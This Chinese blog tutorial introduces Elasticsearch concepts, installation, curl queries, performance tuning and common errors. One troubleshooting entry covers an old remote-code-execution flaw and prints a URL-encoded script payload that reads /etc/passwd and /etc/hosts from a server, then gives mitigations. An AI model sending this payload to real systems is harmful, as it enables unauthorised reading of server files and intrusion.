---
lgyout: post
title: Elasticsearch Introduction
category: 技术 
tags: elasticsearch
keywords: elasticsearch
description: 
---

# ElasticSearch入门

---

##1.概述
Elasticsearch （ES）是一个基于 Lucene 的开源搜索引擎，它不但稳定、可靠、快速，而且也具有良好的水平扩展能力，是专门为`分布式`环境设计的。
###1.1 特性

>•**安装方便**：没有其他依赖，下载后安装非常方便；只用修改几个参数就可以搭建起来一个集群
>•**JSON**：输入/输出格式为 JSON，不需要定义 Schema，快捷方便
>•**RESTful**：基本所有操作（索引、查询、甚至是配置）都可以通过 HTTP 接口进行
>•**分布式**：节点对外表现对等（每个节点都可以用来做入口）；加入节点自动均衡
>•**多租户**：可根据不同的用途分索引；可以同时操作多个索引
>•**准实时**：从文档索引到可以被检索只有轻微延时，约1s

###1.2 集群
其中一个节点就是一个 ES进程，多个节点组成一个集群。一般每个节点都运行在不同的操作系统上，配置好集群相关参数后 ES会自动组成集群（节点发现方式也可以配置）。集群内部通过 ES 的选主算法选出主节点，而集群外部则是可以通过任何节点进行操作，无主从节点之分（对外表现对等/去中心化，有利于客户端编程，例如故障重连）。

###1.3 索引
“索引”有两个意思：
>•作为动词，它指的是把一个文档“保存”到 ES 中的过程，索引一个文档后，我们就可以使用 ES 搜索到这个文档
>•作为名词，它是指保存文档的地方，相当于一个数据库概念中的“库”


为了方便理解，我们可以将 ES 中的一些概念对应到我们熟悉的关系型数据库上：
|    ES    		 |   索引   |  类型  |   文档 |
| --------  |  ----    |  ----  | ----   |
|    DB     |    库    |  表    |   行   |

###1.4 分片
ES 是一个分布式系统，它保存索引时会选择适合的“主分片”（Primary Shard），把索引保存到其中（我们可以把分片理解为一块物理存储区域）。分片的分法是固定的，而且是安装时候就必须要决定好的（默认是 5），后面就不能改变了。这里的分片是指对索引进行水平切分。
既然有主分片，那肯定是有“从”分片的，在 ES 里称之为“副本分片”（Replica Shard）。副本分片主要有两个作用：
>•**高可用**：某分片节点挂了的话可走其他副本分片节点，节点恢复后上面的分片数据可通过其他节点恢复
>•**负载均衡**：ES 会自动根据负载情况控制搜索路由，副本分片可以将负载均摊

###1.5 多租户
ES 的多租户简单的说就是通过多索引机制同时提供给多种业务使用，每种业务使用一个索引（关于多租户的详细定义与用途，可以参考这里）。前面我们提到过可以把索引理解为关系型数据库里的库，那多索引可以理解为一个数据库系统建立多个库给不同的业务使用。
在实际使用时，我们可以通过每个租户一个索引的方式将他们的数据进行隔离，并且每个索引是可以单独配置参数的（可对特定租户进行调优），这在典型的 多租户场景下非常有用：例如我们的一个多租户应用需要提供搜索支持，这时可以通过 ES 根据租户建立索引，这样每个租户就可以在自己的索引下搜索相关内容了。

###1.6																	   RESTful
这个特性非常方便，最关键的是 ES 的 HTTP接口不只是可以进行业务操作（索引/搜索），还可以进行配置，甚至是关闭 ES 集群。下面我们介绍几个很常用的接口：
>•/_cat/nodes?v：查集群状态
>•/_cat/shards?v：查看分片状态
>•/index/type/_search：搜索

v 是 verbose 的意思，这样可以更可读（有表头，有对齐），_cat 是监测相关的 APIs，/_cat?help 来获取所有接口。index 和 type 分别是具体的某一索引某一类型，是分层次的。我们也可以直接在所有索引所有类型上进行搜索：/_search。

###1.7	     官方术语表

####1.7.1 analysis 分析
分析是将文本（text）转化为查询词（term）的过程。使用不同的分析器，这三种短语：FOO BAR，Foo-Bar，foo,bar 都有可能被分解成查询词 foo 与 bar。这些查询词实际上将被存储在索引中。一次对 FoO:bAR 的全文查询（不是查询词查询）可能会被分析为为查询词 foo,bar，可以匹配上保存在索引中的查询词。这就是分析处理过程（包含了索引与搜索），它使得 es 可以进行全文查询。

####1.7.2 cluster 集群
一个或多个拥有同一个集群名称的节点组成了一个集群。每个集群都会自动选出一个主节点，如果该主节点故障，则集群会自动选出新的主节点来替换故障节点。代表一个集群，集群中有多个节点，其中有一个为主节点，这个主节点是可以通过选举产生的，主从节点是对于集群内部来说的。es的一个概念就是去中心化，字面上理解就是无中心节点，这是对于集群外部来说的，因为从外部来看es集群，在逻辑上是个整体，你与任何一个节点的通信和与整个es集群通信是等价的。

####1.7.3 document 文档
一个文档就是一个保存在 es 中的 JSON 文本，可以把它理解为关系型数据库表中的一行。每个文档都是保存在索引中的，拥有一种类型和 id。一个文档是一个 JSON 对象（一些语言中的 hash / hashmap / associative array）包含了 0 或多个字段（键值对）。原始的 JSON 文本在索引后将被保存在 _source 字段里，搜索完成后返回值中默认是包含该字段的。

####1.7.4 id
id 是用于标识文档的，一个文档的索引/类型/id 必须是唯一的。可以指定任何类型的字段作为文档 id。如果不指定，则由系统 自动生成。

####1.7.5 field 字段
一个文档包含了若干字段，或称之为键值对。字段的值可以是简单（标量）值（例如字符串、整型、日期），也可以是嵌套结构，例如数组或对象。一个字段 类似于关系型数据库表中的一列。每个字段的映射都有一个字段类型（不要和文档类型搞混了），它描述了这个字段可以保存的值类型，例如整型、字符串、对象。 映射还可以让我们定义一个字段的值如何进行分析。
已经存在的field字段类型无法更改，
对相同index,type以及name的字段类型必须一致。

####1.7.6 index 索引
一个索引类似关系型数据库中的一个数据库，它可以映射为多种类型.一个索引就是逻辑上的一个命名空间，对应到 1或多个主分片上，可以拥有 0 个或多个副本分片。

####1.7.7 mapping 映射
一个映射类似于关系型数据库中的模式(schema)定义。每个索引都存在一个映射，它定义了该索引中的每一种类型，以及索引相关的配置。映射可以显示定义，或者在文档被索引时自动创建。
在实现上，它定义外部数据转化到ES内部数据的流程,由一个或者多个analyzer组成，每个analyzer又由多个filter组成.

####1.7.8 node 节点
一个节点是集群中的一个 es运行实例。测试时，多个节点可以同时启在同一个服务器上，生产环境一般是一个服务器上一个节点。节点启动时将使用单播（或者是组播）来发现和自己配置的集群名称相同的集群，并尝试加入到该集群中。

####1.7.9 primary shard 主分片
每个文档都会被保存在一个主分片上。当我们索引一个文档时，它将在一个主分片上进行索引，然后才放到该主分片的各副本分片上。默认情况下，一个索引 有 5个主分片。我们可以指定更少或更多的主分片来伸缩索引可处理的文档数。需要注意的是，一旦索引创建，就不能修改主分片个数。

####1.7.10 replica shard 副本分片
每个主分片可以拥有0个或多个副本分片。一个副本分片是主分片的一份拷贝，这样做有两个主要原因：
>1.**故障转移**：当主分片失效时，一个副本分片会被提升为主分片
>2.**提高性能**：获取与搜索请求可以被主分片或副本分片处理，es会自动对搜索请求进行负载均衡。默认情况下，每个主分片都有一个副本分片，副本分片的数量可以动态调整。在同一个节点上，副本分片和其主分片不会同时运行

####1.7.11 routing 路由
当我们索引一个文档时，它将被保存在一个主分片上，分片的选择是通过路由值哈希得到的。默认情况下，路由值来自于文档 id，如果该文档指定来了父文档，则路由值来自于父文档 id（这是为了确保子文档和父文档被保存在相同的分片上）。该值可以在索引时指定，也可以通过映射路由字段来指定。

####1.7.12 shard 分片
一个分片就是一个 Lucene 实例，它是 es管理的底层“工作单元”。一个索引是逻辑上的一个命名空间，指向主分片和副本分片。索引的主分片和副本分片数量必须明确指定好，在应用代码使用时只需要处理和索引的交互，不会涉及到和分片的交互。Elasticsearch 会在集群中的所有节点上设置好分片，但节点失效或加入新节点时会自动将移动节点分片。
代表索引分片，es可以把一个完整的索引分成多个分片，这样的好处是可以把一个大的索引拆分成多个，分布到不同的节点上。构成分布式搜索。分片的数量只能在索引创建前指定，并且索引创建后不能更改。

####1.7.13 source field 源字段
默认情况下，在获取和搜索请求返回值中的 _source 字段保存了源 JSON 文本，这使得我们可以直接在返回结果中访问源数据，而不需要根据 id 再发一次检索请求。注意：索引的 JSON 字符串将完整返回，无论是否是一个合法的 JSON。该字段的内容也不会描述数据如何被索引。

####1.7.14 term 查询词
一个查询词是一个被 es 索引的确切值。查询词 foo，Foo，FOO 是不同的。查询词可以使用查询词查询接口进行获取。

####1.7.15 text 文本
文本（或称之为全文）是普通的、非结构化的文本，例如本段话。默认情况下，文本将被分析为查询词，查询词将被保存在索引中。为能够进行全文搜索，文本字段在索引时将被分析为查询词，查询关键字在搜索时也将被分析为查询词，通过对比查询词是否相同而完成全文搜索。

####1.7.16 type 类型
一种类型类似于关系型数据库中的一张表。每种类型都有若干字段，可以用于指定给该类型文档。映射定义了该文档中的每个字段如何进行分析。

####1.7.17 recovery
代表数据恢复或叫数据重新分布，es在有节点加入或退出时会根据机器的负载对索引分片进行重新分配，挂掉的节点重新启动时也会进行数据恢复。

####1.7.18 river
代表es的一个数据源，也是其它存储方式（如：数据库）同步数据到es的一个方法。它是以插件方式存在的一个es服务，通过读取river中的数据并把它索引到es中，官方的river有couchDB的，RabbitMQ的，Twitter的，Wikipedia的，river这个功能将会在后面的文件中重点说到。

####1.7.19 gateway
代表es索引的持久化存储方式，es默认是先把索引存放到内存中，当内存满了时再持久化到硬盘。当这个es集群关闭再重新启动时就会从gateway中读取索引数据。es支持多种类型的gateway，有本地文件系统（默认），分布式文件系统，Hadoop的HDFS和amazon的s3云存储服务。

####1.7.20 discovery.zen
代表es的自动发现节点机制，es是一个基于p2p的系统，它先通过广播寻找存在的节点，再通过多播协议来进行节点之间的通信，同时也支持点对点的交互。

####1.7.21 Transport
过滤器非常有用因为他们比简单的查询更快（不进行文档评分）并且会自动缓存.

##2.实战

###2.1 最新版安装
1. 最新版下载:http://www.elasticsearch.org/download，
2. 并解压放在目录\$ES
3. 下在linux下运行\$ES/bin/elasticsearch
4. 或者在windows下运\$ES\bin\elasticsearch.bat
5. 在浏览器中打开http://localhost:9200/，可以看到ES的运行状态和版本信息。

####2.1.1 插件--head
elasticsearch-head是一个elasticsearch的集群管理工具，它是完全由html5编写的独立网页程序，你可以通过插件把它集成到es。
安装命令:\bin>plugin -install mobz/elasticsearch-head
安装完成后\plugins目录下会有head的文件夹。
进入http://localhost:9200/_plugin/head/即可看到ES集群信息

####2.1.2 插件--bigdesk
bigdesk是elasticsearch的一个集群监控工具，可以通过它来查看es集群的各种状态，如：cpu、内存使用情况，索引数据、搜索情况，http连接数等。
安装命令：\bin>plugin -install lukas-vlcek/bigdesk
进入http://localhost:9200/_plugin/bigdesk/

###2.2 中文版安装
国内的ES大神medcl (http://weibo.com/medcl#_rnd1418954153132) 将ES及中文插件整合做一个ElasticSearch-RTF (Ready To Fly)版，它使用最新稳定的ElasticSearch版本，并且下载测试好对应的插件，如中文分词插件等，还会帮你做好一些默认的配置，目的是让你可以下载下来就可以直接的使用（虽然es已经很简单了，但是很多新手还是需要去花时间去找配置，中间的过程其实很痛苦），当然等你对这些都熟悉了之后，你完全可以自己去diy了，跟linux的众多发行版是一个意思。
>1. 运行环境
    a.JDK7
        b.系统可用内存>2G
	>2. 下载
	git clone git://github.com/medcl/elasticsearch-rtf.git -b master --depth 1
	百度云盘:
	http://pan.baidu.com/s/1pJNkrUV
	>3. 配置 elasticsearch-rtf / elasticsearch / bin / service / elasticsearch.conf
	默认JAVA HEAP大小为2G，根据你的服务器环境，需要自行调整，一般设置为物理内存的50%.
	set.default.ES_HEAP_SIZE=2048
	>4. 启动Redis，供插件使用(ansj,string2int)
	>5. 运行 linux:
	    cd elasticsearch/bin/service
	    ./elasticsearch console
	    windows:
	    cd elasticsearch/bin/service
	    elasticsearch.bat
	>6. 工具
	    使用浏览器打开：http://localhost:9200/_plugin/rtf/

###2.3 测试
在命令行中使用curl命令：
    curl:  -X 后面跟 RESTful ：  GET, POST ...
        -d 后面跟数据。 (d = data to send)

1. create:
指定 ID 来建立新记录。 （貌似PUT， POST都可以）

    ```
        $ curl -XPOST localhost:9200/films/md/2 -d '
	    { "name":"hei yi ren", "tag": "good"}'
	使用自动生成的 ID 建立新纪录：
	$ curl -XPOST localhost:9200/films/md -d '
	{ "name":"ma da jia si jia3", "tag": "good"}'

    ```

2. 查询：
查询所有的 index, type:

```
$ curl localhost:9200/_search?pretty=true
```

3. 查询某个index下所有的type:

```
$ curl localhost:9200/films/_search
```

4. 查询某个index 下， 某个 type下所有的记录：

```
$ curl localhost:9200/films/md/_search?pretty=true
```

5. 带有参数的查询：

```
$ curl localhost:9200/films/md/_search?q=tag:good
{
   "took":7,
   "timed_out":false,
   "_shards":{
      "total":5,
      "successful":5,
      "failed":0
    },
    "hits":{
      "total":2,
      "max_score":1.0,
      "hits":[{
        "_index":"film",
        "_type":"md",
        "_id":"2",
        "_score":1.0,
        "_source" :{
           "name":"hei yi ren",
           "tag":"good"
	   }
	},
	{
	"_index":"film",
	"_type":"md",
	"_id":"1",
	"_score":0.30685282,
	"_source" : {
		  "name":"ma da jia si jia",
		  "tag": "good"
		  }}
        ]
     }
}
```

6. 使用JSON参数的查询： （注意 query 和 term 关键字）


```
$ curl localhost:9200/film/_search -d '
   {"query" : { "term": { "tag":"bad"}}}'
```
query参数又分三类：
- "match_all" : { } 直接请求全部；
- "term"/"text"/"prefix"/"wildcard" : { "key" : "value" } 根据字符串搜索(严格相等/片断/前缀/匹配符);
- "range" : { "@timestamp" : { "from" : "now-1d", "to" : "now" } } 根据范围搜索，如果type是时间格式，可以使用内置的now表示当前，然后用-1d/h/m/s来往前推。

filter
上面提到的query的参数，在filter中也都存在。此外，还有比较重要的参数就是连接操作：
"or"/"and" : [{"range":{}}, {"prefix":""}] 两个filter的查询，交集或者合集；
"bool" : ["must":{},"must_not":{},"should":{}] 上面的and虽然更快，但是只能支持两个，超过两个的，要用 bool 方法；
"not"/"limit" : {} 取反和限定执行数。注意这个limit和mysql什么的有点不同：它限定的是在每个shards上执行多少条。如果你有5个shards，其实对整个index是limit了5倍大小的设定值。
另一点比较关键的是：filter结果默认是不缓存的，如果常用，需要指定 "_cache" : true。


7. update

    ```
        $ curl -XPUT localhost:9200/films/md/1 -d { ...(data)... }

    ```
    8. 删除。 删除所有的：

    ```
        $ curl -XDELETE localhost:9200/films
    ```


##3 优化
###3.1 索引优化
ES索引优化篇主要从两个方面解决问题，

1. 索引数据过程
2. 检索过程

ES索引的过程到相对Lucene的索引过程多了分布式数据的扩展，而这ES主要是用tranlog进行各节点之间的数据平衡。所以从上我可以通过索引的 settings进行第一优化：

```
“index.translog.flush_threshold_ops”: “100000″
“index.refresh_interval”: “-1″,
```

这两个参数第一是到tranlog数据达到多少条进行平衡，默认为5000，而这个过程相对而言是比较浪费时间和资源的。所以我们可以将这个值调大一些还是 设为-1关闭，进而手动进行tranlog平衡。第二参数是刷新频率，默认为120s是指索引在生命周期内定时刷新，一但有数据进来能refresh像 lucene里面commit,我们知道当数据addDoucment会，还不能检索到要commit之后才能行数据的检索所以可以将其关闭，在最初索引 完后手动refresh一之，然后将索引setting里面的index.refresh_interval参数按需求进行修改，从而可以提高索引过程效 率。
另外的知道ES索引过程中如果有副本存在，数据也会马上同步到副本中去。我个人建议在索引过程中将副本数设为0，待索引完成后将副本数按需量改回来，这样也可以提高索引效率。

```
“number_of_replicas”: 0
```

检索速度快度与索引质量有很大的关系。而索引质量的好坏与很多因素有关。

1. 分片数
分片数，与检索速度非常相关的的指标，如果分片数过少或过多都会导致检索比较慢。分片数过多会导致检索时打开比较多的文件别外也会导致多台服务器之间通讯。而分片数过少为导至单个分片索引过大，所以检索速度慢。
在确定分片数之前需要进行单服务单索引单分片的测试。比如我之前在IBM-3650的机器上，创建一个索引，该索引只有一个分片，分别在不同数据量的情况下进行检索速度测试。最后测出单个分片的内容为20G。
所以索引分片数=数据总量/单分片数
目前，我们数据量为4亿多条，索引大小为近1.5T左右。因为是文档数据所以单数据都中8K以前。现在检索速度保证在100ms 以下。特别情况在500ms以下，做200,400,800，1000，1000+用户长时间并发测试时最坏在750ms以下.
2. 副本数
副本数与索引的稳定性有比较大的关系，怎么说，如果ES在非正常挂了，经常会导致分片丢失，为了保证这些数据的完整性，可以通过副本来解决这个问题。建议在建完索引后在执行Optimize后，马上将副本数调整过来。
大家经常有一个误去副本越多，检索越快，这是不对的，副本对于检索速度其它是减无增的我曾做过实现，随副本数的增加检索速度会有微量的下降，所以大家在设置 副本数时，需要找一个平衡值。另外设置副本后，大家有可能会出现两次相同检索，出现出现不同值的情况，这里可能是由于tranlog没有平衡、或是分片路 由的问题，可以通过?preference=_primary 让检索在主片分上进行。
3. 分词
其实分词对于索引的影响可大可小，看自己把握。大家越许认为词库的越多，分词效果越好，索引质量越好，其实不然。分词有很多算法，大部分基于词表进行分词。 也就是说词表的大小决定索引大小。所以分词与索引膨涨率有直接链接。词表不应很多，而对文档相关特征性较强的即可。比如论文的数据进行建索引，分词的词表 与论文的特征越相似，词表数量越小，在保证查全查准的情况下，索引的大小可以减少很多。索引大小减少了，那么检索速度也就提高了。
4. 索引段
索引段即lucene中的segments概念，我们知道ES索引过程中会refresh和tranlog也就是说我们在索引过程中segments number不至一个。而segments number与检索是有直接联系的，segments number越多检索越慢，而将segments numbers
有可能的情况下保证为1这将可以提到将近一半的检索速度。
```
        curl -XPOST 'http://localhost:9200/twitter/_optimize? max_num_segments =1′
```

5. 删除文档
删除文档在Lucene中删除文档，数据不会马上进行硬盘上除去，而进在lucene索引中产生一个.del的文件，而在检索过程中这部分数据也会参与检索，lucene在检索过程会判断是否删除了，如果删除了在过滤掉。这样也会降低检索效率。所以可以执行清除删除文档。
	```
        $ curl -XPOST ‘http://localhost:9200/twitter/_optimize?     only_expunge_deletes =true
	```
	    　
	    ###3.2 内存和打开的文件数
	    1. 内存
	    如果你的elasticsearch运行在专用服务器上，经验值是分配一半内存给elasticsearch。另一半用于系统缓存，这东西也很重要的。
	    你可以通过修改`ES_HEAP_SIZE`环境变量来改变这个设定。在启动elasticsearch之前把这个变量改到你的预期值。另一个选择上调该elasticsearch的`ES_JAVA_OPTS`变量，这个变量时在启动脚本(elasticsearch.in.sh或elasticsearch.bat)里传递的。你必须找到-Xms和-Xmx参数，他们是分配给进程的最小和最大内存。建议设置成相同大小。嗯，`ES_HEAP_SIZE`其实就是干的这个作用。
	    你必须确认文件描述符限制对你的elasticsearch足够大，建议值是32000到64000之间。关于这个限制的设置，另有[教程](http://www.elasticsearch.org/tutorials/2011/04/06/too-many-open-files.html)
	    2. 目录数
	    一个可选的做法是把所有日志存在一个索引里，然后用[ttl field](http://www.elasticsearch.org/guide/reference/mapping/ttl-field.html)来确保就日志被删除掉了。不过当你日志量够大的时候，这可能就是一个问题了，因为用TTL会增加开销，优化这个巨大且唯一的索引需要太长的时间，而且这些操作都是资源密集型的。
	    建议的办法是基于时间做目录。比如，目录名可以是YYYY-MM-DD的时间格式。时间间隔完全取决于你打算保留多久日志。如果你要保留一周，那一天一个目录就很不错。如果你要保留一年，那一个月一个目录可能更好点。目录不要太多，因为全文搜索的时候开销相应的也会变大。
	    如果你选择了根据时间存储你的目录，你也可以缩小你的搜索范围到相关的目录上。比如，如果你的大多数搜索都是关于最近的日志的，那么你可以在自己的界面上提供一个”快速搜索”的选项只检索最近的目录。
	    3. 轮转和优化
	    移除旧日志在有基于时间的目录后变得异常简单：

    ```
        $curl -XDELETE 'http://localhost:9200/old-index-name/'
	    ```
	    这个操作的速度非常快，和删除大小差不多的少量文件速度接近。你可以放进crontab里半夜来做。
	    [Optimizing indices](http://www.elasticsearch.org/guide/reference/api/admin-indices-optimize.html)是在非高峰时间可以做的一件很不错的事情。因为它可以提高你的搜索速度。尤其是在你是基于时间做目录的情况下，更建议去做了。因为除了当前的目录外，其他都不会再改，你只需要对这些旧目录优化一次就一劳永逸了。
	        ```
		    $curl -XPOST 'http://localhost:9200/old-index-name/_optimize'
		        ```
###3.3 分片和复制
通过elasticsearch.yml或者使用REST API，你可以给每个目录配置自己的设定。具体细节参见[链接](http://www.elasticsearch.org/guide/reference/setup/configuration.html)。
有趣的是分片和复制的数量。默认情况下，每个目录都被分割成5个分片。如果集群中有一个以上节点存在，每个分片会有一个复制。也就是说每个目录有一共10个分片。当往集群里添加新节点的时候，分片会自动均衡。所以如果你有一个默认目录和11台服务器在集群里的时候，其中一台会不存储任何数据。
每个分片都是一个Lucene索引，所以分片越小，elasticsearch能放进分片新数据越少。如果你把目录分割成更多的分片，插入速度更快。请注意如果你用的是基于时间的目录，你只在当前目录里插入日志，其他旧目录是不会被改变的。
太多的分片带来一定的困难——在空间使用率和搜索时间方面。所以你要找到一个平衡点，你的插入量、搜索频率和使用的硬件条件。
另一方面，复制帮助你的集群在部分节点宕机的时候依然可以运行。复制越多，必须在线运行的节点数就可以越小。复制在搜索的时候也有用——更多的复制带来更快的搜索，同时却增加创建索引的时间。因为对猪分片的修改，需要传递到更多的复制。
###3.4 映射_source和_all
[Mappings](http://www.elasticsearch.org/guide/reference/mapping/)定义了你的文档如何被索引和存储。
映射有着合理的默认值，字段的类型会在新目录的第一条文档插入的时候被自动的检测出来。不过你或许会想自己来调控这点。比如，可能新目录的第一条记录的message字段里只有一个数字，于是被检测为长整型。当接下来99%的日志里肯定都是字符串型的，这样Elasticsearch就没法索引他们，只会记录一个错误日志说字段类型不对。这时候就需要显式的手动映射”message” : {“type” : “string”}。
当你使用基于时间的目录名时，在配置文件里创建索引模板可能更适合一点。详见链接。除去你的映射，你还可以定义其他目录属性，比如分片数等等。
在映射中，你可以选择压缩文档的_source。这实际上就是整行日志——所以开启压缩可以减小索引大小，而且依赖你的设定，提高性能。经验值是当你被内存大小和磁盘速度限制的时候，压缩源文件可以明显提高速度，相反的，如果受限的是CPU计算能力就不行了。
默认情况下，除了给你所有的字段分别创建索引，elasticsearch还会把他们一起放进一个叫_all的新字段里做索引。好处是你可以在_all里搜索那些你不在乎在哪个字段找到的东西。另一面是在创建索引和增大索引大小的时候会使用额外更多的CPU。所以如果你不用这个特性的话，关掉它。即使你用，最好也考虑一下定义清楚限定哪些字段包含进_all里。
###3.5 刷新间隔
在文档被索引后，Elasticsearch某种意义上是近乎实时的。在你搜索查找文档之前，索引必须被刷新。默认情况下，目录是每秒钟自动异步刷新的。
刷新是一个非常昂贵的操作，所以如果你稍微增大一些这个值，你会看到非常明显提高的插入速率。具体增大多少取决于你的用户可以接受到什么程度。
你可以在[index template](http://www.elasticsearch.org/guide/reference/api/admin-indices-templates.html)里保存期望的刷新间隔值。或者保存在elasticsearch.yml配置文件里，或者通过[REST API](http://www.elasticsearch.org/guide/reference/api/admin-indices-update-settings.html)升级索引设定。
另一个处理办法是禁用掉自动刷新，办法是设为-1。然后用REST API手动的刷新。当你要一口气插入海量日志的时候非常有效。不过通常情况下，你一般会采用的就是两个办法：在每次bulk插入后刷新或者在每次搜索前刷新。这都会推迟他们自己本身的操作响应。
Thrift
通常时，REST接口是通过HTTP协议的，不过你可以用更快的Thrift替代它。你需要安装transport-thrift plugin同时保证客户端支持这点。比如，如果你用的是pyes Python client，只需要把连接端口从默认支持HTTP的9200改到默认支持Thrift的9500就好了。
###3.6 异步复制
通常，一个索引操作会在所有分片(包括复制的)都完成对文档的索引后才返回。你可以通过index API设置复制为异步的来让复制操作在后台运行。你可以直接使用这个API，也可以使用现成的客户端(比如pyes或者rsyslog的omelasticsearch)，都会支持这个。
用过滤器替代请求
通常，当你搜索日志的时候，你感兴趣的是通过时间序列做排序而不是评分。这种使用场景下评分是很无关紧要的功能。所以用过滤器来查找日志比用请求更适宜。因为过滤器里不会执行评分而且可以被自动缓存。
###3.7 批量索引
建议使用[bulk API](http://www.elasticsearch.org/guide/reference/api/bulk.html)来创建索引它比你一次给一条日志创建一次索引快多了。
主要要考虑两个事情：
- 最佳的批量大小。它取决于很多你的设定。如果要说起始值的话，可以参考一下pyes里的默认值，即400。
- 给批量操作设定时器。如果你添加日志到缓冲，然后等待它的大小触发限制以启动批量插入，千万确定还要有一个超时限制作为大小限制的补充。否则，如果你的日志量不大的话，你可能看到从日志发布到出现在elasticsearch里有一个巨大的延时。


##4. 可能遇到的问题
1. 由gc引起节点脱离集群
因为gc时会使jvm停止工作，如果某个节点gc时间过长，master ping3次（zen discovery默认ping失败重试3次）不通后就会把该节点剔除出集群，从而导致索引进行重新分配。
解决方法：
>（1）优化gc，减少gc时间。
>（2）调大zen discovery的重试次数（es参数：ping_retries）和超时时间（es参数：ping_timeout）。后来发现根本原因是有个节点的系统所在硬盘满了。导致系统性能下降。

2. out of memory错误
     因为默认情况下es对字段数据缓存（Field Data Cache）大小是无限制的，查询时会把字段值放到内存，特别是facet查询，对内存要求非常高，它会把结果都放在内存，然后进行排序等操作，一直使用 内存，直到内存用完，当内存不够用时就有可能出现out of memory错误。
     解决方法：
     >（1）设置es的缓存类型为Soft Reference，它的主要特点是据有较强的引用功能。只有当内存不够的时候，才进行回收这类内存，因此在内存足够的时候，它们通常不被回收。另外，这 些引 用对象还能保证在Java抛出OutOfMemory 异常之前，被设置为null。它可以用于实现一些常用图片的缓存，实现Cache的功能，保证最大限度的使用内存而不引起OutOfMemory。在es 的配置文件加上index.cache.field.type: soft即可。
     >（2）设置es最大缓存数据条数和缓存失效时间，通过设置index.cache.field.max_size: 50000来把缓存field的最大值设置为50000，设置index.cache.field.expire: 10m把过期时间设置成10分钟。

3. 无法创建本地线程问题
es恢复时报错：
RecoverFilesRecoveryException[[index]
[3] Failed to transfer [215] files with total size of [9.4gb]];
nested: OutOfMemoryError[unable to create new native thread]; ]]
刚开始以为是文件句柄数限制，但想到之前报的是too many open file这个错误，并且也把数据改大了。查资料得知一个进程的jvm进程的最大线程数为：虚拟内存/（堆栈大小*1024*1024），也就是说虚拟内存 越大或堆栈越小，能创建的线程越多。重新设置后还是会报那这错，按理说可创建线程数完全够用了的，就想是不是系统的一些限制。后来在网上找到说是max user processes的问题，这个值默认是1024，这个参数单看名字是用户最大打开的进程数，但看官方说明，就是用户最多可创建线程数，因为一个进程最少 有一个线程，所以间接影响到最大进程数。调大这个参数后就没有报这个错了。
解决方法：
>（1）增大jvm的heap内存或降低xss堆栈大小（默认的是512K）。
>（2）打开/etc/security/limits.conf ，把soft    nproc     1024这行的1024改大就行了。

4. 集群状态为黄色时并发插入数据报错
[7]: index [index], type [index], id [1569133], message [UnavailableShardsException[[index][1] [4] shardIt, [2] active : Timeout waiting for [1m], request: org.elasticsearch.action.bulk.BulkShardRequest@5989fa07]]
这是错误信息，当时集群状态为黄色，即副本没有分配。当时副本设置为2，只有一个节点，当你设置的副本大于可分配的机器时，此时如果你插入数据就有可能报 上面的错，因为es的写一致性默认是使用quorum，即quorum值必须大于（副本数/2+1），我这里2/2+1=2也就是说要要至少插入到两份索 引中，由于只有一个节点，quorum等于1，所以只插入到主索引，副本找不到从而报上面那个错。
解决方法：
>（1）去掉没分配的副本。
>（2）把写一致性改成one，即只写入一份索引就行。

5. 设置jvm锁住内存时启动警告
当设置bootstrap.mlockall: true时，启动es报警告Unknown mlockall error 0，因为linux系统默认能让进程锁住的内存为45k。
解决方法：
>设置为无限制，linux命令：ulimit -l unlimited

6. 错误使用api导致集群卡死
其实这个是很低级的错误。功能就是更新一些数据，可能会对一些数据进行删除，但删除时同事使用了deleteByQuery这个接口，通过构造 BoolQuery把要删除数据的id传进去，查出这些数据删除。但问题是BoolQuery最多只支持1024个条件，100个条件都已经很多了，所以 这样的查询一下子就把es集群卡死了。
解决方法：
>用bulkRequest进行批量删除操作。

7. org.elasticsearch.transport.RemoteTransportException: Failed to deserialize exception response from stream
原因:es节点之间的JDK版本不一样
解决方法：
>统一JDK环境

8. org.elasticsearch.client.transport.NoNodeAvailableException: No node available
1） 端口错
    ```java
        client = new TransportClient().addTransportAddress(new InetSocketTransportAddress(ipAddress, 9300));
	    ```
	    这里9300 写成9200的话会No node available要是你连的不是本机，注意IP有没有正确
	    2）jar报引用版本不匹配，开启的服务是什么版本，引用的jar最好匹配（这个我没有去试，反正我的是匹配的）
	    3） 要是你改了集群名字，还有设置集群名字
	        ```java
		    Settings settings =     ImmutableSettings.settingsBuilder().put("cluster.name", "xxx").build();
		        client = new TransportClient(settings).addTransportAddress(new InetSocketTransportAddress(ipAddress, 9300));
			    ```
			    4）集群超过5s没有响应
			    解决方法
			    >1. 设置client.transport.ping_timeout设大
			    >2. 代码内加入
			        ```java
				    while (true) {
				            try {
				                bulk.execute().actionGet(getRetryTimeout());
						break;
					    }
					    catch (NoNodeAvailableException cont) {
					        Thread.sleep(5000);
					        continue;
					    }
				    }
			```

9. elasticsearch
   近日被发现漏洞，可以远程执行任意代码，由于elasticsearch提供了http接口，导致可能通过CSRF等方式借助恶意页面浏览发生攻击。
   漏洞影响版本:
   elasticsearch 1.2以下
   测试代码：
   http://ESSERVERIP:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111102863897154977554_1400571156308&_=1400571156309
   浏览器会返回/etc/passwd内容
   解决方案：
   >1、在配置文件elasticsearch.yml里设置script.disable_dynamic: true
   >2、严格限制可访问elasticsearch服务的IP地址




参考文献：
- Elasticsearch Guide
- Elasticsearch Glossary of terms
- ES China Conference 3 PPT: http://pan.baidu.com/s/1i3qsoBF
- http://www.cnblogs.com/MrHiFiy/archive/2012/12/06/2806228.html
- http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_disabling_dynamic_scripts
- http://blog.csdn.net/laigood/article/details/8193170




